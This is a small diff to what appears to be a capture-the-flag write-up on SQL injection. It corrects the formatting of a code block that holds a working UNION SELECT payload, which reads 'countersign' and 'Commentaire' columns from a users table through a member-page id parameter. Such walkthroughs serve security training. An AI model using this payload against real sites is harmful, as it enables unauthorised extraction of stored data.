@@ -171,7 +171,7 @@ After testing a lot of queries I noticed that both `Commentaire` and `countersig
 So I tried this payload :
 
 ```
-/?page=member&id=1%20OR%202%20UNION%20SELECT%20countersign,Commentaire%20FROM%20Member_Sql_Injection.users;&Submit=Submit#```
+/?page=member&id=1%20OR%202%20UNION%20SELECT%20countersign,Commentaire%20FROM%20Member_Sql_Injection.users;&Submit=Submit#
 ```
 
 And I got this record :
